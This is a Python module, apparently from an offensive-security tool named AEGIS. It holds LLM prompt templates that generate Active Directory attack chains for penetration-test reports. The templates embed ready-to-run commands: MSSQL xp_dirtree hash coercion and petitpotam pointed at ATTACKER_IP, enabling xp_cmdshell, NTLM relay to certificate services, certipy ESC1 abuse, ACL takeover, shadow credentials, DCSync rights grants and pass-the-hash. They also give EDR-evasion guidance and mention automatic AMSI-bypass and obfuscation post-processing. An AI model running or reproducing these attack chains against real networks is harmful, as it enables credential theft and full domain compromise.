"""
Dynamic Prompt Architecture for Attack Chain Generation
Location: backend/routers/attack_paths/constants/dynamic_prompts.py

This module implements edge-specific prompt selection to eliminate technique bleeding
and improve attack chain accuracy. Instead of one monolithic prompt that confuses the
model with irrelevant techniques, we select focused prompts based on detected edge types.

Architecture:
1. EDGE_SPECIFIC_PROMPTS - Registry mapping edge types to focused prompts
2. EDGE_PRIORITY - Priority ordering for multi-edge paths
3. get_prompt_for_edges() - Dynamic prompt selector

Author: AEGIS Development Team
Date: February 2026
"""

from typing import List, Dict, Optional
import logging

logger = logging.getLogger(__name__)

# =============================================================================
# EDGE PRIORITY MAP
# Higher priority = more significant attack (used for multi-edge paths)
# =============================================================================
EDGE_PRIORITY = {
    # Tier 0 - Domain Compromise (Highest Priority)
    "DCSync": 100,
    "GetChanges": 100,
    "GetChangesAll": 100,
    "GetChangesInFilteredSet": 100,
    "GoldenCert": 100,
    "HasTrustKeys": 98,

    # Tier 1 - Near-Domain Compromise (ADCS)
    "ADCSESC1": 95,
    "ADCSESC2": 95,
    "ADCSESC3": 95,
    "ADCSESC4": 94,
    "ADCSESC5": 93,
    "ADCSESC6": 93,
    "ADCSESC6a": 93,
    "ADCSESC6b": 93,
    "ADCSESC7": 92,
    "ADCSESC8": 91,
    "ADCSESC9": 90,
    "ADCSESC9a": 90,
    "ADCSESC9b": 90,
    "ADCSESC10": 90,
    "ADCSESC10a": 90,
    "ADCSESC10b": 90,
    "ADCSESC11": 89,
    "ADCSESC12": 88,
    "ADCSESC13": 87,
    "ADCSESC14": 86,
    "ADCSESC15": 85,
    "ManageCA": 90,
    "CoerceAndRelayNTLMToADCS": 88,

    # Tier 2 - High-Value Access
    "AdminTo": 80,
    "GenericAll": 75,
    "WriteDacl": 74,
    "WriteOwner": 73,
    "Owns": 72,
    "AllExtendedRights": 71,
    "WriteGPLink": 70,

    # Tier 3 - Credential Access
    "HasSPNConfigured": 65,
    "Kerberoastable": 65,
    "ASREPRoastable": 64,
    "DontReqPreAuth": 64,
    "DumpSMSAPassword": 63,
    "SyncLAPSPassword": 62,

    # Tier 4 - Delegation Abuse
    "AllowedToDelegate": 60,
    "AllowedToAct": 59,
    "AddAllowedToAct": 59,
    "WriteAccountRestrictions": 59,
    "TrustedForDelegation": 58,
    "CoerceToTGT": 58,
    "AbuseTGTDelegation": 58,
    "ReadGMSAPassword": 57,
    "ReadLAPSPassword": 56,

    # Tier 5 - ACL Abuse
    "GenericWrite": 55,
    "WriteSPN": 54,
    "AddKeyCredentialLink": 53,
    "AddMember": 52,
    "AddSelf": 51,
    "ForceChangePassword": 50,

    # Tier 6 - Lateral Movement
    "CanRDP": 45,
    "CanPSRemote": 44,
    "ExecuteDCOM": 43,
    "SQLAdmin": 42,

    # Tier 7 - NTLM Relay
    "CoerceAndRelayNTLMToSMB": 48,
    "CoerceAndRelayNTLMToLDAP": 47,
    "CoerceAndRelayNTLMToLDAPS": 46,

    # Tier 8 - Session/Credential Harvesting
    "HasSession": 40,
    "HasSIDHistory": 39,
    "SpoofSIDHistory": 39,

    # Tier 9 - Hybrid Identity
    "SyncedToEntraUser": 35,

    # Tier 10 - Group Membership (Informational)
    "MemberOf": 30,
    "Contains": 25,
    "GPLink": 20,
    "TrustedBy": 15,
}


# =============================================================================
# SERVICE-SPECIFIC CONTEXT DETECTION
# Used to inject additional attack context when service accounts are detected
# =============================================================================

# MSSQL service account indicators
MSSQL_INDICATORS = [
    'SQL_SVC',
    'MSSQL',
    'SQLSERVER',
    'MSSQLSVC',
    'SQLSVC',
    'SA@',
    'SQLADMIN',
]

# ADCS/Certificate Services indicators
ADCS_INDICATORS = [
    'CA_SVC',
    'CA_OPERATOR',
    'CA_ADMIN',
    'CERTSVC',
    'CERT_PUBLISHERS',
    'PKI',
    'ADCS',
    'CERTIFICATE',
    'CA-',
    '-CA',
]

# Exchange indicators
EXCHANGE_INDICATORS = [
    'EXCHANGE',
    'EXCH_',
    'EXCHSRV',
    'MSEXCHANGE',
    'EXCHANGE WINDOWS PERMISSIONS',
    'EXCHANGE TRUSTED SUBSYSTEM',
]

# MSSQL attack context - injected when SQL service accounts detected
# Uses safe_format() to handle missing keys gracefully
MSSQL_ATTACK_CONTEXT = """
## MSSQL SERVICE DETECTED
The attack path involves an MSSQL service account. Consider these additional attacks:

**Connect to MSSQL (if credentials obtained):**
```bash
# Impacket MSSQL client
impacket-mssqlclient {{domain}}/USER:'PASSWORD'@SQL_SERVER -windows-auth
```

**Hash Capture via xp_dirtree (requires Responder/ntlmrelayx running):**
```sql
-- Coerce MSSQL service to authenticate to attacker
EXEC xp_dirtree '\\\\ATTACKER_IP\\share',1,1;
```

**Check for Command Execution:**
```sql
-- Enable xp_cmdshell if admin
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Linked Server Enumeration:**
```sql
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
-- Hop to linked server
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];
```
"""

# ADCS attack context - injected when certificate services detected
ADCS_ATTACK_CONTEXT = """
## ADCS/CERTIFICATE SERVICES DETECTED
The attack path involves Active Directory Certificate Services. Consider these attacks:

**Certipy Enumeration (find vulnerable templates):**
```bash
certipy find -u USER@{{domain}} -p 'PASSWORD' -dc-ip {dc_hostname} -stdout
certipy find -u USER@{{domain}} -p 'PASSWORD' -dc-ip {dc_hostname} -vulnerable -stdout
```

**ESC1 - Misconfigured Certificate Template:**
If a template allows low-privilege enrollment AND client authentication AND allows SAN specification:
```bash
certipy req -u USER@{{domain}} -p 'PASSWORD' -ca CA_NAME -template VulnerableTemplate -upn administrator@{{domain}} -dc-ip {dc_hostname}
certipy auth -pfx administrator.pfx -dc-ip {dc_hostname}
```

**ESC8 - Web Enrollment NTLM Relay:**
```bash
# Start relay to AD CS web enrollment
ntlmrelayx.py -t http://ca.{{domain}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Coerce target machine authentication
petitpotam.py ATTACKER_IP DC.{{domain}} -u USER -p 'PASSWORD'
```

**Shadow Credentials on CA (if GenericWrite on CA):**
```bash
certipy shadow auto -u USER@{{domain}} -p 'PASSWORD' -account CA_SERVER$
```
"""

# Exchange attack context - injected when Exchange service accounts detected
EXCHANGE_ATTACK_CONTEXT = """
## EXCHANGE SERVICE DETECTED
The attack path involves Exchange. Consider these attacks:

**WriteDacl via Exchange Windows Permissions:**
If user is member of Exchange Windows Permissions group, can grant DCSync rights:
```powershell
# Grant DCSync rights to controlled user
Add-DomainObjectAcl -TargetIdentity "DC={{domain_dn}}" -PrincipalIdentity compromised_user -Rights DCSync -Verbose
```

**Exchange Organization Management:**
Members can modify Exchange configuration and potentially access all mailboxes:
```powershell
# Add yourself to Organization Management (if you have GenericAll)
Add-ADGroupMember -Identity "Organization Management" -Members compromised_user
```

**ProxyLogon/ProxyShell (if vulnerable Exchange version):**
```bash
# Check Exchange version
nxc smb EXCHANGE_SERVER -u USER -p 'PASSWORD' -M exchange
```
"""


# =============================================================================
# WRITEOWNER → ADCS CHAIN PROMPT
# Multi-stage finding: WriteOwner to ADCS account → Full ADCS exploitation
# =============================================================================
WRITEOWNER_ADCS_CHAIN_PROMPT = """You are generating a **multi-stage WriteOwner → ADCS** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: WRITEOWNER TO ADCS EXPLOITATION CHAIN
This is a COMPOUND ATTACK that chains WriteOwner/WriteDacl on an ADCS service account
into full domain compromise via certificate abuse. The target ({target}) is involved
in Active Directory Certificate Services.

## COMPLETE ATTACK CHAIN (ALL STEPS REQUIRED)

### Phase 1: ACL Abuse (WriteOwner → Full Control)
1. **Take Ownership** - Use WriteOwner to become owner of the target account
2. **Grant Full Control** - As owner, modify DACL to grant yourself GenericAll

### Phase 2: Account Takeover
3. **Shadow Credentials OR Password Reset** - Take over the ADCS account
   - Shadow Credentials (stealthier): Add msDS-KeyCredentialLink, authenticate via PKINIT
   - Password Reset (simpler): Change the account password directly

### Phase 3: ADCS Exploitation
4. **Enumerate ADCS** - Find vulnerable certificate templates as the CA account
5. **Exploit Certificate Template** - Request certificate as Administrator (ESC1/ESC4)
6. **Authenticate with Certificate** - Get NT hash for Administrator
7. **Domain Compromise** - Pass-the-hash or access DC directly

## TOOLS AND COMMANDS

**Phase 1 - ACL Abuse (Impacket - Linux):**
```bash
# Step 1: Take ownership
impacket-owneredit -action write -new-owner '{source}' -target '{target}' '{domain}'/'{source}':'PASSWORD'

# Step 2: Grant full control
impacket-dacledit -action write -rights FullControl -principal '{source}' -target '{target}' '{domain}'/'{source}':'PASSWORD'
```

**Phase 2 - Account Takeover (Option A - Shadow Credentials):**
```bash
# Add shadow credentials
pywhisker -d {domain} -u '{source}' -p 'PASSWORD' --target '{target}' --action add

# Get TGT via PKINIT
gettgtpkinit.py -cert-pfx {target}.pfx -pfx-pass PASSWORD {domain}/{target} {target}.ccache

# Get NT hash from TGT
export KRB5CCNAME={target}@cifs_{dc_hostname}@{domain}.ccache
getnthash.py -key AS_REP_KEY {domain}/{target}
```

**Phase 2 - Account Takeover (Option B - Password Reset):**
```bash
# Reset password with bloodyAD
bloodyAD -d {domain} -u '{source}' -p 'PASSWORD' --host DC_HOSTNAME set password '{target}' 'NewP@ssw0rd!'
```

**Phase 3 - ADCS Exploitation:**
```bash
# Enumerate ADCS as the CA account
certipy find -u '{target}'@{domain} -hashes :NT_HASH -dc-ip {dc_hostname} -stdout -vulnerable

# If ESC1/ESC4 template found - request cert as Administrator
certipy req -u '{target}'@{domain} -hashes :NT_HASH -ca CA_NAME -template VulnerableTemplate -upn administrator@{domain} -dc-ip {dc_hostname}

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip {dc_hostname}
# Result: NT hash for Administrator

# Pass-the-hash to DC
impacket-psexec -hashes :ADMIN_NT_HASH administrator@DC_HOSTNAME
```

## CRITICAL RULES
1. CHAIN ALL PHASES - This is a multi-stage attack, include ALL phases
2. Use actual hostnames from the path - NO placeholder IPs like <DC_IP>
3. Use Impacket tools (impacket-owneredit, impacket-dacledit) for ACL abuse
4. Show BOTH shadow credentials AND password reset options
5. End with domain compromise (Admin access to DC)

## OUTPUT FORMAT
Generate 6-7 steps covering this complete chain:
1. Take Ownership (impacket-owneredit)
2. Grant Full Control (impacket-dacledit)
3. Shadow Credentials or Password Reset
4. Enumerate ADCS (certipy find)
5. Exploit Certificate Template (certipy req)
6. Authenticate with Certificate (certipy auth)
7. Domain Compromise (psexec/evil-winrm)

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 6-7 steps covering this WriteOwner → ADCS exploitation chain. This MUST be a complete chain from initial ACL abuse to domain compromise."""


def _safe_format(template: str, context: dict) -> str:
    """
    Safely format a template, only replacing keys that exist in context.
    Uses double braces {{key}} for keys we want to replace from context.
    """
    # Replace double braces with actual values from context
    result = template
    for key, value in context.items():
        placeholder = "{{" + key + "}}"
        if placeholder in result:
            result = result.replace(placeholder, str(value))
    return result


def detect_service_context(context: dict) -> str:
    """
    Detect service-specific attack opportunities from the attack path context.
    Returns additional context string to inject into prompts.

    Checks both:
    - Source/target node names for service indicators (SQL_SVC, CA_SVC, etc.)
    - Edge types for service-specific edges (SQLAdmin, ADCSESC*, etc.)

    Args:
        context: Dict with source, target, attack_path, domain, edge_types, etc.

    Returns:
        Service context string to append to prompts, or empty string
    """
    source = context.get('source', '').upper()
    target = context.get('target', '').upper()
    attack_path = context.get('attack_path', '').upper()
    edge_types = context.get('edge_types', '').upper()
    combined = f"{source} {target} {attack_path}"

    service_contexts = []
    detected_services = set()

    # Check for MSSQL indicators (name-based OR edge-based)
    has_mssql_name = any(indicator in combined for indicator in MSSQL_INDICATORS)
    has_mssql_edge = 'SQLADMIN' in edge_types
    if (has_mssql_name or has_mssql_edge) and 'mssql' not in detected_services:
        detected_services.add('mssql')
        logger.info(f"MSSQL service detected in path: {source} -> {target} (name={has_mssql_name}, edge={has_mssql_edge})")
        service_contexts.append(_safe_format(MSSQL_ATTACK_CONTEXT, context))

    # Check for ADCS indicators (name-based OR edge-based)
    has_adcs_name = any(indicator in combined for indicator in ADCS_INDICATORS)
    has_adcs_edge = any(edge in edge_types for edge in ['ADCSESC', 'MANAGECA', 'GOLDENCERT', 'COERCEANDRELAYNTLMTOADCS'])
    if (has_adcs_name or has_adcs_edge) and 'adcs' not in detected_services:
        detected_services.add('adcs')
        logger.info(f"ADCS service detected in path: {source} -> {target} (name={has_adcs_name}, edge={has_adcs_edge})")
        service_contexts.append(_safe_format(ADCS_ATTACK_CONTEXT, context))

    # Check for Exchange indicators (name-based)
    has_exchange = any(indicator in combined for indicator in EXCHANGE_INDICATORS)
    if has_exchange and 'exchange' not in detected_services:
        detected_services.add('exchange')
        logger.info(f"Exchange service detected in path: {source} -> {target}")
        service_contexts.append(_safe_format(EXCHANGE_ATTACK_CONTEXT, context))

    return "\n".join(service_contexts)


# =============================================================================
# ENTITY CONTEXT BUILDER - Fix 1: Entity Name Threading
# Injects concrete entity names at the TOP of prompts to eliminate placeholders
# =============================================================================

def build_entity_context(context: Dict) -> str:
    """
    Build a prominent ENTITY CONTEXT block to inject at the start of prompts.

    This ensures the LLM has actual entity names front-and-center, reducing
    placeholder usage (e.g., <TARGET>, {domain}) by 50%+.

    Args:
        context: Dict with source, target, domain, source_type, target_type, etc.

    Returns:
        Formatted entity context string to prepend to prompts
    """
    source = context.get('source', '')
    target = context.get('target', '')
    domain = context.get('domain', '')
    dc_hostname = context.get('dc_hostname', '')
    source_type = context.get('source_type', 'Principal')
    target_type = context.get('target_type', 'Object')

    # Extract clean names (without domain suffix for display)
    source_clean = source.split('@')[0] if '@' in source else source
    target_clean = target.split('@')[0] if '@' in target else target

    # Annotate names with type when it could be confused (Group, Computer, Domain, OU)
    # This prevents the LLM from treating a Group as a Computer (e.g., HELPDESK is a Group, not a host)
    type_annotations = {'Group', 'Computer', 'Domain', 'OU'}

    source_display = source_clean
    if source_type in type_annotations:
        source_display = f"{source_clean} (AD {source_type})"

    target_display = target_clean
    if target_type in type_annotations:
        target_display = f"{target_clean} (AD {target_type})"

    # Add type-specific warnings to prevent common LLM mistakes
    type_warnings = []
    if source_type == 'Group':
        type_warnings.append(f"⚠️ {source_clean} is an AD GROUP — you CANNOT authenticate as a group. Authenticate as a MEMBER of this group (e.g., a user account that belongs to {source_clean}). In commands, use a member's username, NOT the group name.")
    if target_type == 'Group':
        type_warnings.append(f"⚠️ {target_clean} is an AD GROUP — you CANNOT connect to it via RDP/WinRM/evil-winrm. It is NOT a computer.")
    if source_type == 'Computer':
        type_warnings.append(f"⚠️ {source_clean} is a COMPUTER ACCOUNT — authenticate using its machine account hash (NT hash), not a password.")
    if target_type == 'Domain':
        type_warnings.append(f"⚠️ {target_clean} is the DOMAIN OBJECT — attacks target domain-level permissions (DCSync, WriteDacl on domain).")

    # Build the entity context block
    lines = [
        "=" * 70,
        "## ENTITY CONTEXT - USE THESE EXACT NAMES IN ALL COMMANDS",
        "=" * 70,
        "",
        f"**SOURCE ENTITY (Attacker controls this):**",
        f"  - Full Name: {source}",
        f"  - Short Name: {source_display}",
        f"  - Type: {source_type}",
        "",
        f"**TARGET ENTITY (Attack objective):**",
        f"  - Full Name: {target}",
        f"  - Short Name: {target_display}",
        f"  - Type: {target_type}",
        "",
        f"**DOMAIN:**",
        f"  - Domain: {domain}",
        f"  - DC Hostname: {dc_hostname}",
        "",
        "**COMMAND SUBSTITUTION RULES:**",
        f"  - When command needs USER/SOURCE → use: {source_clean}",
        f"  - When command needs TARGET → use: {target_clean}",
        f"  - When command needs DOMAIN → use: {domain}",
        f"  - When command needs DC → use: {dc_hostname}",
    ]

    if type_warnings:
        lines.append("")
        lines.extend(type_warnings)

    lines.extend([
        "",
        "⚠️ NEVER use placeholders like <TARGET>, <USER>, <DOMAIN>, <DC_IP>",
        "⚠️ ALWAYS substitute with the actual names shown above",
        "=" * 70,
        "",
    ])

    return "\n".join(lines)


# =============================================================================
# COMMON PROMPT SECTIONS (Reusable across prompts)
# =============================================================================
COMMON_HEADER = """## ENVIRONMENT
- Domain: {domain}
- Attack Path: {attack_path}
- First Node in Path: {source}
- Target (Objective): {target}
- Edge Types: {edge_types}
{t0_context}
{available_vectors}"""

COMMON_STARTING_POSITION = """## CRITICAL: START FROM LOW PRIVILEGE
The attacker starts as a **regular domain user with no special privileges**.
Do NOT assume the attacker already has access to {source} - Step 1 must show HOW to get there."""

COMMON_OUTPUT_FORMAT = """## OUTPUT FORMAT
**PARSER REQUIREMENT:** The report only displays attack steps if you use this exact structure. Use "### Step 1:", "### Step 2:", etc. Each step should have **OPSEC-SAFE Option:** and/or **AGGRESSIVE Option:** with code blocks (```).

### SINGLE vs DUAL OPTION RULE (IMPORTANT)
- Provide TWO options (SAFE + AGGRESSIVE) ONLY when a genuine OPSEC-safe alternative exists
- If NO real OPSEC-safe alternative exists for a step, provide ONLY the AGGRESSIVE option
- A correct single option is ALWAYS better than a forced/fake second option
- NEVER invent theoretical, comment-only, or incomplete commands just to fill the SAFE slot

**Examples of steps that should have ONLY ONE option (aggressive):**
- DCSync (impacket-secretsdump) — no native safe equivalent exists
- LSASS dumping — inherently detectable, no LOTL alternative
- Pass-the-Hash lateral movement — requires offensive tools

**Examples of steps that should have TWO options:**
- Kerberoasting — SAFE: native .NET KerberosRequestorSecurityToken / AGGRESSIVE: Rubeus
- Password reset — SAFE: Set-ADAccountPassword / AGGRESSIVE: bloodyAD
- Group enumeration — SAFE: Get-ADGroupMember / AGGRESSIVE: PowerView

⚠️ When providing two options, they MUST use DIFFERENT tools/approaches — NOT the same command with minor variations!

For each step, format EXACTLY as:

### Step [N]: [Action Title]
**Objective:** What this step accomplishes in the attack chain

**Prerequisites:**
- What access/tools/privileges are needed before this step
- What must be true for this step to work

**OPSEC-SAFE Option: [Native/LOTL Tool Name]**
```powershell
# Stealth approach - blends with normal admin activity
# Context: Run on [ATTACKER/VICTIM] machine

PS > [Native PowerShell/LOTL command here]
```
> **Why this is safer:** [Explain how this blends in - e.g., "Uses native AD cmdlets that appear as normal admin activity"]

**AGGRESSIVE Option: [Offensive Tool Name]** ⚠️ May trigger AV/EDR
```bash
# Fast/reliable approach - uses well-known offensive tools
# Context: Run on [ATTACKER/VICTIM] machine

$ [Impacket/offensive tool command here]
```
> **Detection Risk:** [Specific alerts - e.g., "Triggers Event 4662, detected by CrowdStrike/Defender"]

**What happens next:** [1 sentence connecting to the next step]

---

## CRITICAL: COMMANDS MUST BE EXECUTABLE
- NEVER put Cypher/Neo4j queries (MATCH, RETURN, WHERE) inside code blocks
- Every code block MUST contain a COMPLETE, WORKING command — no truncated loops, no missing closing braces
- SAFE options: Prefer Get-AD*, Set-AD*, net.exe, dsquery, nltest
- AGGRESSIVE options: Use bloodyAD, impacket-*, nxc, certipy, Mimikatz, Rubeus
- If LIVE GRAPH DATA is provided above, use those real entity names in your commands
- Comment-only code blocks (lines starting with #) are NOT acceptable as commands
- Each code block MUST have at least one executable line (starting with $, PS >, or a tool name)
- Keep commands SIMPLE and COPY-PASTE READY — do not write multi-line loops or complex scripts

## NO FILLER STEPS
Do NOT pad the attack chain with unnecessary steps. Each step must perform a REAL action:
- ❌ "Extract and Format Hash" (echo hash > file) — tools already output in correct format
- ❌ "Verify Credentials Work" (whoami) — implied by next step succeeding
- ❌ "Save Output to File" (> output.txt) — obvious, not a step
- ❌ "Parse hashes file" (grep krbtgt file) — not an attack step
- ✅ Every step should either OBTAIN something (credentials, access, ticket) or EXPLOIT something (ACL, delegation, session)
If the attack only needs 2 steps, generate 2 steps. Do NOT add filler to reach a higher count."""

COMMON_FORMATTING_RULES = """## COMMAND FORMATTING RULES
1. **Each command on its own line** - never chain multiple commands on one line
2. **Use prompts before commands:**
   - `PS > ` for PowerShell commands (on Windows)
   - `$ ` for bash/Linux commands (on Kali/attacker)
   - `mimikatz # ` for Mimikatz interactive shell
3. **Comments above commands** - use `#` for comments on separate lines
4. **Blank line between commands** - improves readability
5. **Use HOSTNAMES from BloodHound data, NEVER use IP addresses or IP placeholders:**
   - The Domain Controller hostname is: {dc_hostname}
   - Use hostnames from {{source}} and {{target}} in the attack path
   - ✅ CORRECT: `impacket-secretsdump {{domain}}/user@{dc_hostname}`
   - ❌ WRONG: `impacket-secretsdump user@<DC_IP>` or `@10.10.10.100` or `@TARGET_IP`
   - For -dc-ip flags, use: `-dc-ip {dc_hostname}`
   - NEVER use placeholders like <IP>, <DC_IP>, TARGET_IP, ATTACKER_IP
   - NEVER use DC.{{domain}} format - use the actual DC hostname: {dc_hostname}
6. **Use modern tools - avoid deprecated ones:**
   - ✅ Use `nxc` (NetExec) - the active successor
   - ❌ NEVER use `crackmapexec` or `cme` - deprecated and unmaintained
   - Example: `nxc smb {dc_hostname} -u USER -p PASS --laps`
8. **CREDENTIAL PLACEHOLDERS — never hardcode passwords:**
   - Use `<PASSWORD>` as placeholder for unknown/cracked passwords
   - ✅ CORRECT: `impacket-addcomputer -computer-name 'ATTACKERPC' -computer-pass '<PASSWORD>' -dc-ip {dc_hostname} 'DOMAIN/USER:<PASSWORD>'`
   - ❌ WRONG: `addcomputer.py ... 'Password123'` (never use literal passwords)
   - For Kerberos ccache exports: `export KRB5CCNAME=filename.ccache` (NOT KERBCNAME)
   - The ccache filename from impacket-getST follows the format: `USER@spn_TARGET@DOMAIN.ccache` where `/` in the SPN is replaced with `_`
   - Example: `impacket-getST -spn CIFS/DC.SUPPORT.HTB -impersonate Administrator` produces `Administrator@CIFS_DC.SUPPORT.HTB@SUPPORT.HTB.ccache`
   - ❌ WRONG: `export KRB5CCNAME=Administrator.ccache` (simplified name, won't match actual file)
   - ✅ CORRECT: `export KRB5CCNAME=Administrator@CIFS_DC.SUPPORT.HTB@SUPPORT.HTB.ccache`
9. **AUTHENTICATION STRINGS — use the compromised user, not the target:**
   - The authentication identity is the user YOU control, not the target you're attacking
   - ✅ CORRECT: `DOMAIN/compromised_user:<PASSWORD>@TARGET` (authenticate AS the source)
   - ❌ WRONG: `DOMAIN/TARGET_MACHINE:<PASSWORD>@TARGET` (the target's creds are unknown)
   - In RBCD attacks: authenticate as the user with GenericAll, not as the DC machine account
10. **evil-winrm hash format — use NT hash ONLY, not LM:NT pair:**
   - ✅ CORRECT: `evil-winrm -i TARGET -u USER -H <NT_HASH>`
   - ❌ WRONG: `evil-winrm -i TARGET -u USER -H <LM_HASH>:<NT_HASH>` (evil-winrm takes NT hash only)
   - ❌ WRONG: `evil-winrm -i TARGET -u USER -H aaaa:bbbb` (no colon-separated pair)
11. **Impacket -hashes flag — use PLACEHOLDERS, never the empty LM hash:**
   - ✅ CORRECT: `-hashes <LM_HASH>:<NT_HASH>`
   - ❌ WRONG: `-hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>` (looks like a real hash, confuses readers)
12. **Machine account names MUST include the $ suffix:**
   - ✅ CORRECT: `/user:ATTACKERPC$`, `'ATTACKERPC$'`, `-delegate-from 'ATTACKERPC$'`
   - ❌ WRONG: `/user:ATTACKERPC`, `'ATTACKERPC'` (missing $ — will fail)
   - Computer/machine accounts in AD always end with `$`
12. **impacket-secretsdump Kerberos auth — always include domain/user@ prefix:**
   - ✅ CORRECT: `impacket-secretsdump -k -no-pass SUPPORT.HTB/DC\$@{dc_hostname}`
   - ❌ WRONG: `impacket-secretsdump -k -no-pass {dc_hostname}` (missing domain/user prefix)
7. **CRITICAL: Spacing around formatted text** - ALWAYS add spaces around bold/highlighted terms:
   - ✅ CORRECT: "the **DOMAIN ADMINS** group" / "with **SPN** active/CIFS:445"
   - ❌ WRONG: "the**DOMAIN ADMINS**group" / "with**SPN**active/CIFS:445"
   - ❌ WRONG: "WriteDaclonDOMAIN ADMINS" / "member ofADMINISTRATORS"
   - Every bold term MUST have a space before AND after it (unless at start/end of sentence)"""

COMMON_OPSEC_RULES = """## OPSEC CLASSIFICATION RULES (CRITICAL - FOLLOW EXACTLY)

### TIER DIFFERENTIATION
Provide TWO options when a genuine alternative technique exists:
- **OPSEC-SAFE**: Lower detection risk. Use concise Linux/Kali tools that operate via LDAP/Kerberos.
- **AGGRESSIVE**: Higher detection risk but faster/more reliable. May trigger EDR/SIEM.

When NO genuine alternative exists, provide ONLY ONE option. Do NOT fabricate a second option.
⚠️ The two options MUST use DIFFERENT TECHNIQUES — NOT the same command with minor variations.

### OPSEC-SAFE Option Requirements:
1. PREFERRED TOOLS (concise, single-command, run from attacker Kali machine):
   - bloodyAD (LDAP operations: password reset, group membership, SPN manipulation)
   - certipy (shadow credentials, ADCS attacks)
   - impacket tools with Kerberos auth (-k -no-pass)
   - nxc/NetExec (quick enumeration and validation)
   - hashcat, john (offline cracking — always safe)
2. Keep commands SHORT — one-liners, not multi-line PowerShell scripts
3. Do NOT use verbose PowerShell with Add-Type, System.IdentityModel, .NET classes
4. Do NOT use native AD cmdlets (Get-ADUser, Set-ADUser) as SAFE options — these
   require a domain-joined Windows machine which pentesters typically don't have

### AGGRESSIVE Option Requirements:
1. Tools that are effective but may trigger alerts:
   - Mimikatz (sekurlsa, lsadump — triggers EDR)
   - Rubeus (Kerberos operations — known signature)
   - impacket-psexec, impacket-wmiexec (creates services/WMI — logged)
   - Direct password resets (ForceChangePassword — triggers Event 4724)
2. Accept detection risk — include brief risk note in explanation

### Tool Classification Reference:
**SAFE** (low detection, run from attacker machine):
   - bloodyAD — LDAP operations, blends with AD traffic
   - certipy — shadow credentials, ADCS, PKINIT
   - impacket with -k (Kerberos auth) — no NTLM hash on wire
   - nxc/NetExec — quick validation
   - hashcat, john — offline cracking, zero network footprint
   - kerbrute — Kerberos-based, minimal logging

**RISKY** (signatured/detectable):
   - Mimikatz — heavily signatured by ALL EDR
   - Rubeus — known offensive tool, binary detection
   - impacket-secretsdump — generates Event 4662 (DCSync)
   - impacket-psexec — creates Windows service (Event 7045)
   - evil-winrm — WinRM connections logged
   - Any LSASS memory access or service creation

### Example of CORRECT Differentiation:
For "Abuse GenericWrite on User" step:
- **SAFE**: `bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC set object TARGET servicePrincipalName -v 'HTTP/fake'` (one-liner, LDAP)
- **AGGRESSIVE**: `certipy shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET` (shadow credentials, requires LDAPS)

For "Reset user password" step:
- **SAFE**: `bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC set password TARGET 'NewPass!'` (LDAP modify)
- **AGGRESSIVE**: `rpcclient -U USER //DC -c "setuserinfo2 TARGET 23 'NewPass!'"` (RPC-based)

### WHAT NOT TO DO:
❌ Do NOT use multi-line PowerShell scripts with Add-Type, .NET classes, or System.IdentityModel
❌ Do NOT use Get-ADUser/Set-ADUser as SAFE — pentesters run from Kali, not domain-joined Windows
❌ Do NOT present two variants of the SAME tool as different options"""

COMMON_EXCLUSIONS = """## CRITICAL - DO NOT INCLUDE:
- NO Cypher/Neo4j/MATCH queries - AEGIS already queried the graph
- NO BloodHound queries - The reconnaissance is done
- NEVER suggest running BloodHound, SharpHound, or ANY data collection tools
- NEVER say "run BloodHound first", "enumerate with SharpHound", or "collect AD data"
- The BloodHound data is ALREADY LOADED - all attack paths come from existing data
- NEVER use placeholder IPs like <DC_IP> or <TARGET_IP> - use hostnames from the path
- NEVER use deprecated tools like crackmapexec - use nxc (NetExec) instead
- Attack steps should ONLY contain PowerShell, Impacket, offensive tools, and Linux commands
- Do NOT add `Add-Type -AssemblyName` preambles (System.DirectoryServices.Protocols, etc.) unless the command specifically requires that assembly. Use native AD cmdlets instead.
- Do NOT generate AMSI bypass code - it is injected automatically by post-processing
- NEVER insert backtick (`) characters inside command names or parameters for obfuscation (e.g. "Asse`mblyName", "Inv`oke-Mimikatz"). Write clean, unobfuscated commands — obfuscation is applied automatically by post-processing
- NEVER generate base64-encoded PowerShell commands (powershell -enc ...). You cannot produce valid base64 — it will decode to garbage. Use plain-text commands only
- NEVER generate Python one-liners (python3 -c "...") or pypykatz/impacket as Python code. Use the tool's CLI interface directly (e.g., `impacket-secretsdump`, NOT `python3 -c "from impacket..."`)
- evil-winrm is ALWAYS classified as RISKY (offensive tool). The SAFE alternative for WinRM is native PowerShell: `Enter-PSSession` or `Invoke-Command`

## FORBIDDEN AS ATTACK COMMANDS (the user already has the graph - do not re-query it):
- NO bloodhound-python, SharpHound.exe, Invoke-BloodHound, or ANY BloodHound collection
- NO Neo4j connection commands (Invoke-Neo4jQuery, bolt://, Neo4j driver, etc.)
- NO "bloodhound-python -d DOMAIN -u USER -p PASS -ns DC -c DCSync" — this is DATA COLLECTION not an attack
- NEVER suggest running BloodHound data collection as an attack step or OPSEC option
- For "Enumerate paths to X" or "Discovery" findings: the path is ALREADY FOUND. Steps must be HOW TO EXPLOIT the path (e.g. abuse GenericAll, add self to group, run secretsdump), NOT how to collect more data

## REMOTE ACCESS TOOL SELECTION (CRITICAL - CONTEXT-DEPENDENT)
Choose the correct remote access tool based on the **account's privilege level**:

**For initial access with cracked service accounts (e.g., svc-alfresco, SQL_SVC):**
- ✅ USE evil-winrm — these accounts are typically in Remote Management Users, NOT local admins
- ❌ DO NOT use impacket-wmiexec or impacket-psexec — these REQUIRE local admin rights and will fail with ACCESS_DENIED

**For post-escalation access (e.g., after DCSync, with Administrator hash):**
- ✅ USE impacket-wmiexec, impacket-psexec, or evil-winrm — admin accounts have local admin rights
- impacket-psexec is noisier (creates a service), impacket-wmiexec is quieter (uses WMI/DCOM)

**Technical reason:**
- evil-winrm uses WinRM (port 5985/5986) — only requires Remote Management Users membership
- impacket-wmiexec uses WMI/DCOM (port 135) — requires local Administrators group membership
